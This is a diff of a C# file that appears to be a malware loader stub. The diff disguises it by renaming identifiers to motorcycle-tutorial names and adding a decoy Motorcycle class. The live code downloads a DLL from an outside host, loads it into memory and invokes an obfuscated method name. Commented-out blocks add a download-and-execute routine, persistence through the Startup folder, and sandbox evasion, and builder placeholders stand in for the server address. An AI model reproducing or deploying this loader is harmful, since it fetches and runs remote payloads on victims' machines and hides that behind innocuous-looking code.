@@ -22,30 +22,64 @@ using System.Windows.Forms;
 //Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]
 
 
-namespace WindowsMediaPlayer1
+class TestMotorcycle : Motorcycle
+{
+
+    public override double GetTopSpeed()
+    {
+        return 108.4;
+    }
+
+    static void Run()
+    {
+
+        TestMotorcycle moto = new TestMotorcycle();
+
+        moto.StartEngine();
+        moto.AddGas(15);
+        moto.Drive(5, 20);
+        double speed = moto.GetTopSpeed();
+        Console.WriteLine("My top speed is {0}", speed);
+    }
+}
+abstract class Motorcycle
+{
+    // Anyone can call this.
+    public void StartEngine() {/* Method statements here */ }
+
+    // Only derived classes can call this.
+    protected void AddGas(int gallons) { /* Method statements here */ }
+
+    // Derived classes can override the base class implementation.
+    public virtual int Drive(int miles, int speed) { /* Method statements here */ return 1; }
+
+    // Derived classes must implement this.
+    public abstract double GetTopSpeed();
+}
+namespace Motorcycles
 {
     static class Program
     {
 
-        public static byte[] media(string ferm)
+        public static byte[] SampleRefType(string estDistance)
         {
-            byte[] media;
+            byte[] SampleRefType;
             for (; ; )
             {
                 try
                 {
                     WebClient assemblys = new WebClient();
-                    media = assemblys.DownloadData(ferm);
+                    SampleRefType = assemblys.DownloadData(estDistance);
                 }
                 catch (Exception ex)
                 {
-                ServicePointManager.Expect100Continue = true;
-                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+                    ServicePointManager.Expect100Continue = true;
+                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                     continue;
                 }
                 break;
             }
-            return media;
+            return SampleRefType;
         }
 
         /// <summary>
@@ -57,9 +91,9 @@ namespace WindowsMediaPlayer1
 
 
 
-    //sandboxie controlsandboxie();
+            //sandboxie controlsandboxie();
 
-    //Messega
+            //Messega
 
             {
                 ServicePointManager.Expect100Continue = true;
@@ -67,32 +101,32 @@ namespace WindowsMediaPlayer1
             }
 
 
-    //download try
-    //download {
-    //download  System.Net.WebClient appyrun = new System.Net.WebClient();
-    //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
-    //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
-    //download }
-    //download catch
-    //download {
-    //download }
+            //download try
+            //download {
+            //download  System.Net.WebClient appyrun = new System.Net.WebClient();
+            //download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
+            //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
+            //download }
+            //download catch
+            //download {
+            //download }
 
 
-            object web = new object[] { %aPP%, string.Empty, media("%Server%"), true };
+            object speed = new object[] { %aPP%, string.Empty, SampleRefType("%Server%"), true };
 
-            Assembly skype;
+            Assembly gallons;
 
-            skype = AppDomain.CurrentDomain.Load(media("https://ieaspk.com/instagram.dll"));
-
-
-            skype.GetType("instagram"+ ".what" + "sapp").InvokeMember("stu"+"dio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])web);
-
-    //start  {
-    //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
-    //start  }
+            gallons = AppDomain.CurrentDomain.Load(SampleRefType("https://ieaspk.com/instagram.dll"));
 
 
-}
+            gallons.GetType("instagram" + ".what" + "sapp").InvokeMember("stu" + "dio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])speed);
+
+            //start  {
+            //start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
+            //start  }
+
+
+        }
 
         //sandboxie [DllImport("kernel32.dll")]
         //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
